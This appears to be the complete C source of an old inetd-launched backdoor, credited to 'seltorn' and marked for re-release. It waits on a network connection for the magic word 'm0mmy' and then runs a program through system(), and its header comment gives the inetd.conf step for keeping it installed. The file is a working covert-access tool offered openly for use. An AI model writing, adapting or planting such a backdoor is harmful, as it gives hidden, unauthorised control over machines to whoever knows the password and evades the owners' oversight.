/*  add a line to inetd.conf so it executes this   */
/*  coded by seltorn. re-release this shit for nf  */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define MAGICWORD "m0mmy"
#define EXECTHIS  "/usr/sbin/imap2 -i"
void main()
{
        char getit[30];
        char *cnt;
        int ev;

        fgets(getit, 30, stdin);
        cnt = strstr(getit, MAGICWORD);
        ev = (cnt == getit);
        cnt += strlen(MAGICWORD);
        if(*cnt != 13)
                exit(0);
        if(strstr(getit, MAGICWORD) == getit)
                system(EXECTHIS);
}
